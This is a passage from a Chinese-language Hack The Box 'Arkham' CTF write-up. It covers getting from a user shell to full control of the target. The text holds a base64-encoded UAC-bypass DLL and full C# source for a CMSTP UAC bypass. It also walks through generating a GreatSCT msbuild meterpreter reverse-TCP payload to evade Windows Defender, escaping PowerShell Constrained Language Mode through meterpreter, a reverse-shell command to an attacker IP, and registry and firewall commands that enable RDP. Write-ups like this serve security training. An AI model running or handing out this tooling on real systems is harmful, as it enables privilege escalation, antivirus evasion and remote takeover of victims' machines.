HIAZQAgAHcAaQBsAGwAIABiAGUAIAByAHUAbgAgAEIAZQBmAG8AcgBlACAAUwBlAHQAdQBwACAAQgBlAGcAaQBuAHMAIAB0AG8AIABpAG4AcwB0AGEAbABsAA0ACgBSAEUAUABMAEEAQwBFAF8AQwBPAE0ATQBBAE4ARABfAEwASQBOAEUADQAKAHQAYQBzAGsAawBpAGwAbAAgAC8ASQBNACAAYwBtAHMAdABwAC4AZQB4AGUAIAAvAEYADQAKAA0ACgBbAEMAdQBzAHQASQBuAHMAdABEAGUAcwB0AFMAZQBjAHQAaQBvAG4AQQBsAGwAVQBzAGUAcgBzAF0ADQAKADQAOQAwADAAMAAsADQAOQAwADAAMQA9AEEAbABsAFUAUwBlAHIAXwBMAEQASQBEAFMAZQBjAHQAaQBvAG4ALAAgADcADQAKAA0ACgBbAEEAbABsAFUAUwBlAHIAXwBMAEQASQBEAFMAZQBjAHQAaQBvAG4AXQANAAoAIgBIAEsATABNACIALAAgACIAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQBwAHAAIABQAGEAdABoAHMAXABDAE0ATQBHAFIAMwAyAC4ARQBYAEUAIgAsACAAIgBQAHIAbwBmAGkAbABlAEkAbgBzAHQAYQBsAGwAUABhAHQAaAAiACwAIAAiACUAVQBuAGUAeABwAGUAYwB0AGUAZABFAHIAcgBvAHIAJQAiACwAIAAiACIADQAKAA0ACgBbAFMAdAByAGkAbgBnAHMAXQANAAoAUwBlAHIAdgBpAGMAZQBOAGEAbQBlAD0AIgBDAG8AcgBwAFYAUABOACIADQAKAFMAaABvAHIAdABTAHYAYwBOAGEAbQBlAD0AIgBDAG8AcgBwAFYAUABOACIADQAKAA0ACgAAO2MAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AcwB0AHAALgBlAHgAZQAACrDdag7FtE2aTMtg45Z5hgAIt3pcVhk04IkCBg4FAAICGAgEAAECGAQAAQ4OBAABAg4EAAEYDgMgAAEEIAEBCAQgAQEOAwAADgQAAQMOBiABHQ4dAwUgARIlD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")) | Out-Null
    }
    [CMSTPBypass]::Execute($Command)
}
```

準備好檔案後，丟上去

```bash
curl 10.10.16.35/CMSTP-UAC-Bypass.ps1 -o CMSTP-UAC-Bypass.ps1
```

跑起來！！！

```bash
PS C:\Users\Batman> .\CMSTP-UAC-Bypass.ps1
.\CMSTP-UAC-Bypass.ps1 : Operation did not complete successfully because the file contains a virus or potentially unwanted software.
At line:1 char:1
+ .\CMSTP-UAC-Bypass.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

幹 …!?!??!  
所以說 …… 他 Defender 把我的東東給抓走了 QQ

那接著我們可以試著自己 Compile 檔案，通常自己 Compile 的東西，Defender 不會抓

```csharp
/* 
UAC Bypass using CMSTP.exe microsoft binary

Based on previous work from Oddvar Moe
https://oddvar.moe/2017/08/15/research-on-cmstp-exe/

And this PowerShell script of Tyler Applebaum
https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1

Code author: Andre Marques (@_zc00l)
*/
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
    // Our .INF file data!
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = "C:\\windows\\temp";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));

        Console.WriteLine("Payload file written to " + InfFile.ToString());
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
        return true;
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }
}
```

一樣先把檔案丟上去

```bash
curl 10.10.16.35/cmstd-uac-bypass.cs -o cmstd-uac-bypass.cs
```

跑 Compile

```powershell
PS C:\Users\Batman> Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "UAC-Bypass.dll"
Cannot invoke method. Method invocation is supported only on core types in this language mode.
At line:1 char:1
+ Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) - ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
```

看起來是電腦不支援 …

通常出現下面這段文字，代表電腦處於 ConstrainedLanguage 約束語言模式

```
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```

ref:  
https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/

想要確認的方法是，可以在 Powershell 中輸入

```powershell
$ExecutionContext.SessionState.LanguageMode
```

如果回傳 `ConstrainedLanguage` 代表被限制，而 `FullLanguage` 則代表沒有被限制

這個模式被稱作 Constrained Language Mode，CLM，可以透過下列網址的各種方法來 Bypass CLM

[https://www.anquanke.com/post/id/160948](https://www.anquanke.com/post/id/160948)

但上述的方式都偏複雜，所以我想用 meterpreter 的方法來解，在 meterpreter 中，只要使用

```
load powershell
powershell_shell
```

就可以簡單的 Bypass CLM

[https://fireantlabs.com/post/2021/05/powershell-constrained-mode-bypass-with-meterpreter/](https://fireantlabs.com/post/2021/05/powershell-constrained-mode-bypass-with-meterpreter/)

## GreatSCT Run Meterpreter

因為他不能傳 Meterpreter ，會被 Defender 偵測為病毒，所以我們要來搞免殺，並透過 meterpreter 的方法來 Bypass CLM

這邊我使用的方法是 [GreatSCT](https://github.com/GreatSCT/GreatSCT) ，他有許多的 Extenstion 有辦法辦到 Bypass Defender 等防毒的功能

不過 GreatSCT 要用 x86 Kali Linux 跑，我在 ARM Kali 或是 lima 的 x86 Ubuntu 上都怪怪的

首先先進行安裝

```bash
git clone https://github.com/GreatSCT/GreatSCT
cd GreatSCT
cd setup
sudo ./setup.sh -c
```

接下來執行程式

```
┌──(kali㉿kali)-[~/GreatSCT]
└─$ python3 GreatSCT.py
===============================================================================
                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

Main Menu

    1 tools loaded

Available Commands:

    exit            Exit GreatSCT
    info            Information on a specific tool
    list            List available tools
    update          Update GreatSCT
    use         Use a specific tool

Main menu choice: list
```

首先輸入 List 觀察他有哪些 tools

```
===============================================================================
                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Available Tools:

    1)  Bypass
```

發現只有 Bypass (那問屁問 = =?)

再來使用 Bypass 的 Module

```
===============================================================================
                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

Main Menu

    1 tools loaded

Available Commands:

    exit            Exit GreatSCT
    info            Information on a specific tool
    list            List available tools
    update          Update GreatSCT
    use         Use a specific tool

Main menu choice: use Bypass
```

再來觀察 Bypass 的 Module 裡面有哪些 payload，輸入 `list`

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

GreatSCT-Bypass Menu

    26 payloads loaded

Available Commands:

    back            Go to main GreatSCT menu
    checkvt         Check virustotal against generated hashes
    clean           Remove generated artifacts
    exit            Exit GreatSCT
    info            Information on a specific payload
    list            List available payloads
    use         Use a specific payload

GreatSCT-Bypass command: list
```

他就會噴出目前支援的 26 個 Module 了，這邊我選用 9 號，也就是最普通的 meterperter reverse tcp

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Available Payloads:

    1)  installutil/meterpreter/rev_http.py
    2)  installutil/meterpreter/rev_https.py
    3)  installutil/meterpreter/rev_tcp.py
    4)  installutil/powershell/script.py
    5)  installutil/shellcode_inject/base64.py
    6)  installutil/shellcode_inject/virtual.py

    7)  msbuild/meterpreter/rev_http.py
    8)  msbuild/meterpreter/rev_https.py
    9)  msbuild/meterpreter/rev_tcp.py
    10) msbuild/powershell/script.py
    11) msbuild/shellcode_inject/base64.py
    12) msbuild/shellcode_inject/virtual.py

    13) mshta/shellcode_inject/base64_migrate.py

    14) regasm/meterpreter/rev_http.py
    15) regasm/meterpreter/rev_https.py
    16) regasm/meterpreter/rev_tcp.py
    17) regasm/powershell/script.py
    18) regasm/shellcode_inject/base64.py
    19) regasm/shellcode_inject/virtual.py

    20) regsvcs/meterpreter/rev_http.py
    21) regsvcs/meterpreter/rev_https.py
    22) regsvcs/meterpreter/rev_tcp.py
    23) regsvcs/powershell/script.py
    24) regsvcs/shellcode_inject/base64.py
    25) regsvcs/shellcode_inject/virtual.py

    26) regsvr32/shellcode_inject/base64_migrate.py

GreatSCT-Bypass command: use 9
```

接下來得介面其實就跟 metasploit 差不了太多，照著選，最後 generate 就好ㄌ

```
Payload: msbuild/meterpreter/rev_tcp selected

Required Options:

Name                Value       Description
----                -----       -----------
DOMAIN              X           Optional: Required internal domain
EXPIRE_PAYLOAD      X           Optional: Payloads expire after "Y" days
HOSTNAME            X           Optional: Required system hostname
INJECT_METHOD       Virtual     Virtual or Heap
LHOST                           IP of the Metasploit handler
LPORT               4444        Port of the Metasploit handler
PROCESSORS          X           Optional: Minimum number of processors
SLEEP               X           Optional: Sleep "Y" seconds, check if accelerated
TIMEZONE            X           Optional: Check to validate not in UTC
USERNAME            X           Optional: The required user account

 Available Commands:

    back            Go back
    exit            Completely exit GreatSCT
    generate        Generate the payload
    options         Show the shellcode's options
    set             Set shellcode option

[msbuild/meterpreter/rev_tcp>>] set LHOST 10.10.16.35

[msbuild/meterpreter/rev_tcp>>] set LPORT 6666

[msbuild/meterpreter/rev_tcp>>] generate
```

Generate 後，會跳出下面的畫面，算是一個 Summary

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Language: msbuild
 [*] Payload Module: msbuild/meterpreter/rev_tcp
 [*] MSBuild compiles for  us, so you just get xml :)
 [*] Source code written to: /usr/share/greatsct-output/source/payload.xml
 [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/payload.rc

Please press enter to continue >:
```

我們需要關注的檔案就只是 Source Code 以及 Metasploit RC file

首先我們可以先觀察一下 msf 的 RC File

```
┌──(kali㉿kali)-[~/GreatSCT]
└─$ cat /usr/share/greatsct-output/handlers/payload.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.16.35
set LPORT 6666
set ExitOnSession false
exploit -j
```

其實沒什麼，就是教我們 msf 要怎麼下指令

而重點應該會是 xml 的那個檔案

```xml

```

大概的看一下，可以知道這是一個 XML 檔案，可以讓 msbuild 在 build 的過程中去執行下面這些東東，而 Windows Defender 有一個特性是，自己 Compile 的東西自己不會抓，所以我們要利用這個特性來 Bypass Defender

首先先把 xml 檔案丟上去

```bash
curl 10.10.16.35/r.xml -o r.xml
```

接下來把 msf 開好待命

並且執行下面指令

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Batman\r.xml
```

會觀察 Build 到一半卡住  
![](https://i.imgur.com/GiunB9q.png)

而這個時候，我們就收到 meterpreter 的 Session 了  
![](https://i.imgur.com/Tibib2V.png)

## Meterperter Bypass CLM

首先先 migrate 自己的 PID

下 `ps` 找到 `explorer.exe`

```
meterpreter > migrate 4956
[*] Migrating from 1516 to 4956...
[*] Migration completed successfully.
```

再來 run 下面的指令

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > $executioncontext.sessionstate.languagemode
FullLanguage
```

我們用 meterpreter 自己 spawn 出來的 Powershell ，就能 Bypass CLM

再來回到前面的 CMSTP-UAC-Bypass 的 Part，我們先準備好 Source.cs 檔案，執行下面兩行來 Compile DLL

```powershell
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
```

最後再打一次 Shell 回來

```powershell
[CMSTPBypass]::Execute("C:\Users\Batman\tshd_windows_amd64.exe -c 10.10.16.35 -p 6665")
```

幹！終於結束了 Q__Q

![](https://i.imgur.com/v5HJVyZ.png)

再來就可以暢行無阻的去拿 Flag 了

## Beyond System

雖然結束了，但還是想知道自己前面踩的雷到底是為什麼，所以我就先幫他開個 RDP

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

發現他真的 Defender 全開 …..

![](https://i.imgur.com/nvXwgUM.png)

所以先前的 UAC Bypass 就被抓ㄌ

![](https://i.imgur.com/oJaZmKu.png)

先前打的 certutil 也被抓 QAQ  
![](https://i.imgur.com/XsPLvNU.png)

另外，我們也可以直接去 `C:\tomcat\apache-tomcat-8.5.37\webapps` 把原始檔案抓回家看一下

在 `ROOT/userSubscribe.jsp` 可以看到塞入 Viewstate 的點

```xml

```

而 `WEB-INF/web.xml` 跟我們先前從 smb 得到的檔案一致

```xml
org.apache.myfaces.SECRET
SnNGOTg3Ni0=

    
        org.apache.myfaces.MAC_ALGORITHM
        HmacSHA1
     

org.apache.myfaces.MAC_SECRET
SnNGOTg3Ni0=
```

而 `WEB-INF/classes/jsfHelloWorldBean/HelloWorldJSFManagedBean.class`  
可以用 JD-GUI 拆開來看，裡面也沒啥東西，但可以注意到他有 implements Serializable

```java
public class HelloWorldJSFManagedBean implements Serializable {
  private static final long serialVersionUID = 1L;

  private UserFormView userFormView = new UserFormView();

  public UserFormView getUserFormView() {
    return this.userFormView;
  }

  public void setUserFormView(UserFormView userFormView) {
    this.userFormView = userFormView;
  }

  public String showUserDetails() {
    System.out.println("The Name Of the user is :" + this.userFormView.getUserName());
    return "welcomePage";
  }
}
```

Java 的反序列化 function 叫做 `readObject`，而我們知道這個反序列化漏洞在 myfaces 裡面，所以可以直接跟進去找一下 `myfaces-impl-1.2.9.jar` 裡面的 `JspStateManagerlmpl.class` 第 752 行

總之，程式會在這個 function 中，把 View State 的東西執行反序列化，達成攻擊的效果

```java
protected Object deserializeView(Object state)
    {
        if (log.isTraceEnabled()) log.trace("Entering deserializeView");

        if(state instanceof byte[])
        {
            if (log.isTraceEnabled()) log.trace("Processing deserializeView - deserializing serialized state. Bytes : "+((byte[]) state).length);

            try
            {
                ByteArrayInputStream bais = new ByteArrayInputStream((byte[]) state);
                InputStream is = bais;
                if(is.read() == COMPRESSED_FLAG)
                {
                    is = new GZIPInputStream(is);
                }
                ObjectInputStream ois = null;
                try
                {
                    final ObjectInputStream in = new MyFacesObjectInputStream(is);
                    ois = in;
                    Object object = null;
                    if (System.getSecurityManager() != null) 
                    {
                        object = AccessController.doPrivileged(new PrivilegedExceptionAction() 
                        {
                            public Object[] run() throws PrivilegedActionException, IOException, ClassNotFoundException
                            {
                                return new Object[] {in.readObject(), in.readObject()};                                    
                            }
                        });
                    }
                    else
                    {
                        object = new Object[] {in.readObject(), in.readObject()};
                    }
                    return object;
                }
```

我們也可以在 `StateUtils.class` 中找到加密相關的資訊

```java
public final class StateUtils {

private static final Log log = LogFactory.getLog(StateUtils.class);

public static final String ZIP_CHARSET = "ISO-8859-1";

public static final String DEFAULT_ALGORITHM = "DES";
public static final String DEFAULT_ALGORITHM_PARAMS = "ECB/PKCS5Padding";

public static final String INIT_PREFIX = "org.apache.myfaces.";
```

這題就差不多這樣ㄅ，好累 QQ

## Ref

- https://blog.kaibro.tw/2020/02/23/Java反序列化之readObject分析/
- https://www.cnblogs.com/backlion/p/10493919.html
- https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/
- https://issues.apache.org/jira/browse/MYFACES-4133
- https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization
- https://www.exploit-db.com/docs/48126
- https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEMYFACESCORE-30680
- https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
- https://www.cnblogs.com/backlion/p/10493919.html
- https://0xrick.github.io/hack-the-box/arkham/
- https://0xdf.gitlab.io/2019/08/10/htb-arkham.html
- https://hipotermia.pw/htb/arkham
- https://github.com/GreatSCT/GreatSCT
- https://github.com/padovah4ck/PSByPassCLM
- https://darkwing.moe/2021/04/25/Arkham-HackTheBox/
- https://en.wikipedia.org/wiki/Jakarta_Server_Faces
